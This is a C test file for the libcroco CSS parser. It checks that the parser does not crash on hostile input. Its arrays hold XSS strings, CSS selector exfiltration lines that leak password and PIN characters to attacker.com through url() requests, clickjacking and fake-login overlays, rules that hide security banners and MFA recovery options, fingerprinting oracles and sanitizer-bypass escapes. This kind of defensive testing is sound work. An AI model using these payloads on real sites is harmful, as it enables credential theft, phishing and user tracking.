/* -*- Mode: C; indent-tabs-mode:nil; c-basic-offset: 8-*- */

#include <glib.h>
#include "cr-statement.h"
#include "cr-declaration.h"
#include "cr-stylesheet.h"
#include "cr-string.h"

static void test_reflected_css_injection(void) {
    const char* payloads[] = {"</style><script>alert(1)</script>",
                              "body { background: url('javascript:alert(1)') }",
                              "input[type=\"<script>alert(1)</script>\"]",
                              "<!-- <script>alert(1)</script> -->",
                              "/* <script>alert(1)</script> */",
                              "@import \"javascript:alert(1)\";",
                              "body { font-family: '</style><script>alert(1)</script>'; }",
                              NULL};

    int i;
    for (i = 0; payloads[i] != NULL; i++) {
        CRStatement* statement = NULL;
        const guchar* payload = (const guchar*)payloads[i];

        /* Just parsing should not crash */
        statement = cr_statement_parse_from_buf(payload, CR_UTF_8);

        if (statement) {
            /* If it parses, we can try to serialize it back to ensure that doesn't crash either */
            gchar* result = cr_statement_list_to_string(statement, 0);
            if (result) {
                g_free(result);
            }
            cr_statement_destroy(statement);
        }
    }
}

static void test_style_attribute_injection(void) {
    /* Payloads simulating injection into style="..." */
    const char* payloads[] = {"width: 10px; </style><script>alert(1)</script>",
                              "background-image: url('javascript:alert(1)')",
                              "expression(alert(1))",
                              "behavior: url(xss.htc)",
                              "-moz-binding: url('http://example.com/xss.xml#test')",
                              "/* */ ; } <script>alert(1)</script>",
                              NULL};

    int i;
    for (i = 0; payloads[i] != NULL; i++) {
        CRDeclaration* decl = NULL;
        const guchar* payload = (const guchar*)payloads[i];

        decl = cr_declaration_parse_list_from_buf(payload, CR_UTF_8);

        if (decl) {
            guchar* result = cr_declaration_list_to_string(decl, 0);
            if (result) {
                g_free(result);
            }
            cr_declaration_destroy(decl);
        }
    }
}

static void test_url_injection(void) {
    /* Payloads specifically targeting url() parsing in various contexts */
    const char* payloads[] = {"@import url(\"javascript:alert(1)\");",
                              "@import \"javascript:alert(1)\";",
                              "div { background: url(javascript:alert(1)); }",
                              "div { background: url('javascript:alert(1)'); }",
                              "div { list-style-image: url(\"vbscript:msgbox(1)\"); }",
                              "@font-face { font-family: 'x'; src: url('javascript:alert(1)'); }",
                              NULL};

    int i;
    for (i = 0; payloads[i] != NULL; i++) {
        CRStatement* statement = NULL;
        const guchar* payload = (const guchar*)payloads[i];

        statement = cr_statement_parse_from_buf(payload, CR_UTF_8);

        if (statement) {
            gchar* result = cr_statement_list_to_string(statement, 0);
            if (result) {
                g_free(result);
            }
            cr_statement_destroy(statement);
        }
    }
}

static void test_breakout_and_redress(void) {
    const char* payloads[] = {
        /* Breaking out of a CSS string */
        "div { content: \"foo\"; } body { background: red; } .bar { content: \"baz\"; }",
        "div { content: \"foo\\\"; } body { background: red; } .bar { content: \\\"baz\"; }",

        /* Breaking out of a CSS comment */
        "/* safe comment */ } body { display: block; } /*",

        /* Breaking out of a CSS block */
        "div { color: blue; } body { background: yellow; }",

        /* UI redress via CSS-only overlay */
        "div.fake-login { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: "
        "white; }",

        /* Form field masking */
        "input[name=\"password\"] { opacity: 0; filter: alpha(opacity=0); }",
        "input.real-field { visibility: hidden; }",

        /* Clickjacking assist */
        "iframe { opacity: 0.001; position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }",

        NULL};

    int i;
    for (i = 0; payloads[i] != NULL; i++) {
        CRStatement* statement = NULL;
        const guchar* payload = (const guchar*)payloads[i];

        statement = cr_statement_parse_from_buf(payload, CR_UTF_8);

        if (statement) {
            gchar* result = cr_statement_list_to_string(statement, 0);
            if (result) {
                g_free(result);
            }
            cr_statement_destroy(statement);
        }
    }
}

static void test_advanced_css_threats(void) {
    const char* payloads[] = {
        /* Credential "prompt" phishing */
        ".login-overlay { position: fixed; top: 0; left: 0; background: #fff; z-index: 10000; }",

        /* Content spoofing/defacement */
        "h1::before { content: 'WARNING: Account Suspended. '; color: red; }",
        ".branding { display: none; } .attacker-branding { display: block; }",

        /* Security banner removal */
        "#security-warning, .consent-banner, .anti-phishing { display: none !important; visibility: hidden !important; "
        "}",

        /* Disable/obscure logout controls */
        "a[href*='logout'] { pointer-events: none; cursor: default; opacity: 0.5; }",

        /* Hide MFA recovery options */
        ".mfa-recovery, #lost-device { display: none; }",

        /* Trick "copy" UI */
        ".address-box { user-select: none; } .address-box::after { content: '1AttackerAddress...'; user-select: all; }",

        /* Drag-and-drop deception */
        ".drop-zone { position: absolute; transform: scale(100); opacity: 0; }",

        /* CSS-based data exfiltration (selector probing) */
        "input[value^='a'] { background: url('https://attacker.com/leak?char=a'); }",
        "input[value^='b'] { background: url('https://attacker.com/leak?char=b'); }",
        "input[type='password'][value$='1'] { list-style: url('https://attacker.com/leak?last=1'); }",

        NULL};

    int i;
    for (i = 0; payloads[i] != NULL; i++) {
        CRStatement* statement = NULL;
        const guchar* payload = (const guchar*)payloads[i];

        statement = cr_statement_parse_from_buf(payload, CR_UTF_8);

        if (statement) {
            gchar* result = cr_statement_list_to_string(statement, 0);
            if (result) {
                g_free(result);
            }
            cr_statement_destroy(statement);
        }
    }
}

static void test_css_exfiltration(void) {
    /* Stylesheet-based exfiltration vectors */
    const char* sheet_payloads[] = {
        /* Blind CSS exfiltration / Background-image requests */
        "input[value^='4'] { background-image: url('https://attacker.com/4'); }",
        "input[name='pin'][value$='2'] { background: url('https://attacker.com/pin-ends-2'); }",

        /* Exfil via @font-face requests */
        "@font-face { font-family: 'leak'; src: url('https://attacker.com/leak?q=a'); unicode-range: U+0061; }",
        "@font-face { font-family: 'leak'; src: url('https://attacker.com/leak?q=b'); unicode-range: U+0062; }",
        "body { font-family: 'leak'; }",

        /* Recursive @import for timing/blind exfiltration */
        "@import url('https://attacker.com/start');",

        NULL};

    int i;
    for (i = 0; sheet_payloads[i] != NULL; i++) {
        CRStatement* statement = NULL;
        const guchar* payload = (const guchar*)sheet_payloads[i];

        statement = cr_statement_parse_from_buf(payload, CR_UTF_8);

        if (statement) {
            gchar* result = cr_statement_list_to_string(statement, 0);
            if (result) {
                g_free(result);
            }
            cr_statement_destroy(statement);
        }
    }

    /* Inline-style exfiltration vectors (style attribute content) */
    const char* decl_payloads[] = {"background-image: url('https://attacker.com/leak?inline=1')",
                                   "list-style-image: url('https://attacker.com/leak?inline=2')",
                                   "--variable: url('https://attacker.com/leak?var=1')", NULL};

    for (i = 0; decl_payloads[i] != NULL; i++) {
        CRDeclaration* decl = NULL;
        const guchar* payload = (const guchar*)decl_payloads[i];

        decl = cr_declaration_parse_list_from_buf(payload, CR_UTF_8);

        if (decl) {
            guchar* result = cr_declaration_list_to_string(decl, 0);
            if (result) {
                g_free(result);
            }
            cr_declaration_destroy(decl);
        }
    }
}

static void test_advanced_exfiltration_leaks(void) {
    const char* payloads[] = {
        /* Exfil via cursor:url(...) */
        "input[value^='x'] { cursor: url('https://attacker.com/leak?c=x'), auto; }",

        /* Exfil via list-style-image:url(...) */
        "li[data-secret^='y'] { list-style-image: url('https://attacker.com/leak?s=y'); }",

        /* Exfil via border-image:url(...) */
        "div[secret='z'] { border-image: url('https://attacker.com/leak?b=z') 30 fill; }",

        /* Exfil via filter:url(...) */
        "body.admin { filter: url('https://attacker.com/leak?isAdmin=true#filter'); }",

        /* Exfil via src: in legacy features */
        "img[src*='secret'] { behavior: url('https://attacker.com/leak?legacy=true'); }",

        /* :visited timing leak / layout leak attempts */
        "a:visited { background: url('https://attacker.com/visited'); border: 1px solid red; width: 100px; }",

        /* Scrollbar-based XS-Leak */
        ".scroll-leak { overflow-y: scroll; width: 100px; height: 100px; background-image: "
        "url('https://attacker.com/leak?scroll=detected'); }",

        /* Resource-timing leak / Cache-based XS-Leaks */
        /* These often rely on complex interactions, but the parser should handle the declarations safely */
        ".timing-leak { background-image: url('https://target.com/resource'); transition: background-image 0s; }",

        NULL};

    int i;
    for (i = 0; payloads[i] != NULL; i++) {
        CRStatement* statement = NULL;
        const guchar* payload = (const guchar*)payloads[i];

        statement = cr_statement_parse_from_buf(payload, CR_UTF_8);

        if (statement) {
            gchar* result = cr_statement_list_to_string(statement, 0);
            if (result) {
                g_free(result);
            }
            cr_statement_destroy(statement);
        }
    }
}

static void test_fingerprinting_and_probing(void) {
    const char* payloads[] = {
        /* Media-query probing */
        "@media (prefers-reduced-motion: reduce) { body { background-image: "
        "url('https://attacker.com/fingerprint?motion=reduce'); } }",
        "@media (min-width: 1920px) { body { background-image: url('https://attacker.com/fingerprint?width=1920'); } }",

        /* Font metric probing (detect installed fonts) */
        "@font-face { font-family: 'CheckFont'; src: local('SomeFont'), url('https://attacker.com/not-installed'); }",

        /* mix-blend-mode history leak variants */
        "div { mix-blend-mode: difference; background: url('https://attacker.com/leak'); }",

        /* backdrop-filter/filter timing */
        ".timing-attack { backdrop-filter: blur(10px); filter: drop-shadow(0 0 10px black); }",

        /* Attribute selector brute forcing */
        "input[value^='a'] { background: url('https://attacker.com/leak?char=a'); }",
        "input[value^='b'] { background: url('https://attacker.com/leak?char=b'); }",

        /* Substring selector exfil */
        "input[value*='secret'] { background: url('https://attacker.com/leak?has=secret'); }",
        "input[value$='end'] { background: url('https://attacker.com/leak?ends=end'); }",

        /* Case-insensitive selector tricks */
        "input[value^='a' i] { background: url('https://attacker.com/leak?char=a_case_insensitive'); }",

        NULL};

    int i;
    for (i = 0; payloads[i] != NULL; i++) {
        CRStatement* statement = NULL;
        const guchar* payload = (const guchar*)payloads[i];

        statement = cr_statement_parse_from_buf(payload, CR_UTF_8);

        if (statement) {
            gchar* result = cr_statement_list_to_string(statement, 0);
            if (result) {
                g_free(result);
            }
            cr_statement_destroy(statement);
        }
    }
}

static void test_selector_abuse_and_probing(void) {
    const char* payloads[] = {
        /* Namespace selector abuse */
        "*|* { color: red; }", "svg|a { fill: blue; }", "|p { display: none; }",

        /* :has()-based probing (if supported by parser, else just ensures no crash) */
        "div:has(input[value='secret']) { background: url('https://attacker.com/found-secret'); }",
        "a:has(> img) { border: 5px solid red; }",

        /* :nth-child() probing */
        "li:nth-child(odd) { background: url('https://attacker.com/odd'); }",
        "tr:nth-child(2n+1) { background: url('https://attacker.com/row'); }",
        "div:nth-last-child(1) { list-style: url('https://attacker.com/last'); }",

        /* :empty probing */
        "div:empty { background: url('https://attacker.com/is-empty'); }",

        /* :target probing */
        "div:target { background: url('https://attacker.com/target-active'); }",

        /* :checked / :valid / :invalid probing */
        "input:checked { background: url('https://attacker.com/is-checked'); }",
        "input:valid { background: url('https://attacker.com/is-valid'); }",
        "form:invalid { background: url('https://attacker.com/form-invalid'); }",

        /* :focus probing */
        "input:focus { background: url('https://attacker.com/has-focus'); }",
        "button:focus-within { background: url('https://attacker.com/focus-within'); }",

        NULL};

    int i;
    for (i = 0; payloads[i] != NULL; i++) {
        CRStatement* statement = NULL;
        const guchar* payload = (const guchar*)payloads[i];

        statement = cr_statement_parse_from_buf(payload, CR_UTF_8);

        if (statement) {
            gchar* result = cr_statement_list_to_string(statement, 0);
            if (result) {
                g_free(result);
            }
            cr_statement_destroy(statement);
        }
    }
}

static void test_bypass_and_gaps(void) {
    const char* payloads[] = {/* CSP bypass via allowed styles / 'unsafe-inline' risk */
                              /* Parser check: Ensure it handles inline styles with remote resources without crashing */
                              "div { background-image: url('https://attacker.com/exfil'); }",

                              /* CSP style-src allowing remote origins (import) */
                              "@import url('https://malicious-cdn.com/style.css');",

                              /* Trusted Types mismatch / DOMPurify gaps */
                              /* Payloads that might slip through sanitizers but are valid CSS */
                              "div { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: "
                              "2147483647; pointer-events: none; }",

                              /* Sanitizer allows style but not safe property lists */
                              "div { -moz-binding: url('xss.xml#test'); }", "div { behavior: url('xss.htc'); }",

                              /* Sanitizer fails on CSS escapes */
                              "div { font-family: '\\3c/style\\3e\\3cscript\\3ealert(1)\\3c/script\\3e'; }",

                              /* Sanitizer fails on malformed CSS */
                              /* Checks if parser is robust against malformed but potentially dangerous input */
                              "div { background: url(javascript:alert(1)); }", /* Unquoted url with scheme */
                              "div { background: url(  javascript:alert(1)  ); }",

                              /* Template injection into CSS contexts */
                              /* Simulating server-side injection where {{user_input}} ends up in CSS */
                              "div { color: {{user_input}}; }", /* If user_input is "red; background: url(...)" */

                              NULL};

    int i;
    for (i = 0; payloads[i] != NULL; i++) {
        CRStatement* statement = NULL;
        const guchar* payload = (const guchar*)payloads[i];

        statement = cr_statement_parse_from_buf(payload, CR_UTF_8);

        if (statement) {
            gchar* result = cr_statement_list_to_string(statement, 0);
            if (result) {
                g_free(result);
            }
            cr_statement_destroy(statement);
        }
    }
}

static void test_parser_differentials_and_obfuscation(void) {
    const char* payloads[] = {/* Markdown-to-HTML style passthrough */
                              /* Often involves raw HTML injection which includes styles */
                              "<style> @import 'http://attacker.com/evil.css'; </style>",

                              /* CSS parser differential (browser mismatch) */
                              /* Ambiguous constructs that might be parsed differently */
                              "div { background: url(java\0script:alert(1)); }",  /* Null byte injection */
                              "div { background: url(java\\0script:alert(1)); }", /* Escaped null */

                              /* CSS escape confusion */
                              "div { \\63\\6f\\6e\\74\\65\\6e\\74: 'secret'; }", /* "content" escaped */
                              "div { content: '\\000041'; }",                    /* "A" with padding zeroes */

                              /* Unicode bidi/RTL trickery in CSS */
                              "/* \u202E */ body { display: none; }", /* Right-to-Left Override in comment */

                              /* Newline normalization bypass */
                              /* \r\n vs \n might break regex-based filters */
                              "div { background:\r\nurl('javascript:alert(1)'); }",

                              /* Comment folding bypass */
                              "div { width: ex/**/pression(alert(1)); }", "div { back/**/ground: url('x'); }",

                              /* Unexpected token recovery */
                              /* Browsers might recover from this, libcroco shouldn't crash */
                              "div { color: red;;; background: blue }", "div { color: red } } body { display: none; }",

                              /* Legacy IE expression() */
                              "div { width: expression(alert(1)); }",
                              "div { zoom: expression(document.body.innerHTML=''); }",

                              NULL};

    int i;
    for (i = 0; payloads[i] != NULL; i++) {
        CRStatement* statement = NULL;
        const guchar* payload = (const guchar*)payloads[i];

        statement = cr_statement_parse_from_buf(payload, CR_UTF_8);

        if (statement) {
            gchar* result = cr_statement_list_to_string(statement, 0);
            if (result) {
                g_free(result);
            }
            cr_statement_destroy(statement);
        }
    }
}

static void test_legacy_features_and_oracles(void) {
    const char* payloads[] = {
        /* Legacy IE behavior: / HTC */
        "body { behavior: url('script.htc'); }",

        /* XBL / binding-style features */
        "div { -moz-binding: url('bindings.xml#mybinding'); }", "div { binding: url('binding.xml'); }",

        /* @supports oracle */
        "@supports (display: grid) { body { background-image: url('https://attacker.com/supports-grid'); } }",
        "@supports not (display: grid) { body { background-image: url('https://attacker.com/no-grid'); } }",
        "@supports (selector(:has(a))) { body { background: url('https://attacker.com/has-supported'); } }",

        /* @media oracles */
        "@media (color-gamut: p3) { body { background: url('https://attacker.com/p3-gamut'); } }",
        "@media (pointer: fine) { body { background: url('https://attacker.com/fine-pointer'); } }",
        "@media (hover: hover) { body { background: url('https://attacker.com/hover-supported'); } }",

        /* prefers-color-scheme probing */
        "@media (prefers-color-scheme: dark) { body { background: url('https://attacker.com/dark-mode'); } }",
        "@media (prefers-color-scheme: light) { body { background: url('https://attacker.com/light-mode'); } }",

        /* Print CSS abuse */
        "@media print { body { display: none; } }",
        "@media print { .total::after { content: '00'; } }",       /* Altering numbers on printed invoices */
        "@media print { .warning { display: none !important; } }", /* Hiding warnings on print */

        NULL};

    int i;
    for (i = 0; payloads[i] != NULL; i++) {
        CRStatement* statement = NULL;
        const guchar* payload = (const guchar*)payloads[i];

        statement = cr_statement_parse_from_buf(payload, CR_UTF_8);

        if (statement) {
            gchar* result = cr_statement_list_to_string(statement, 0);
            if (result) {
                g_free(result);
            }
            cr_statement_destroy(statement);
        }
    }
}

int main(int argc, char** argv) {
    g_test_init(&argc, &argv, NULL);

    g_test_add_func("/libcroco/security/reflected-css-injection", test_reflected_css_injection);
    g_test_add_func("/libcroco/security/style-attribute-injection", test_style_attribute_injection);
    g_test_add_func("/libcroco/security/url-injection", test_url_injection);
    g_test_add_func("/libcroco/security/breakout-and-redress", test_breakout_and_redress);
    g_test_add_func("/libcroco/security/advanced-css-threats", test_advanced_css_threats);
    g_test_add_func("/libcroco/security/css-exfiltration", test_css_exfiltration);
    g_test_add_func("/libcroco/security/advanced-exfiltration-leaks", test_advanced_exfiltration_leaks);
    g_test_add_func("/libcroco/security/fingerprinting-and-probing", test_fingerprinting_and_probing);
    g_test_add_func("/libcroco/security/selector-abuse-and-probing", test_selector_abuse_and_probing);
    g_test_add_func("/libcroco/security/bypass-and-gaps", test_bypass_and_gaps);
    g_test_add_func("/libcroco/security/parser-differentials-and-obfuscation",
                    test_parser_differentials_and_obfuscation);
    g_test_add_func("/libcroco/security/legacy-features-and-oracles", test_legacy_features_and_oracles);

    return g_test_run();
}
